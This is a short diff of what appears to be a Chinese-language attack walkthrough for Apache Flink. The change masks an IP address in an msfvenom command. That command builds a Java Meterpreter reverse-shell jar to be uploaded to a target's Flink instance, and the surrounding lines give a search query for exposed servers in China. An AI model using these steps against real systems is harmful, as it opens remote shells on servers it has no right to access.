@@ -34,7 +34,7 @@ app="Apache-Flink" && country="CN"
 打开MSF 生成一个 jar 木马
 
 ```shell
-msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123  LPORT=4444 -f jar > test.jar
+msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx  LPORT=4444 -f jar > test.jar
 ```
 
 点击 Add 上传 jar 文件
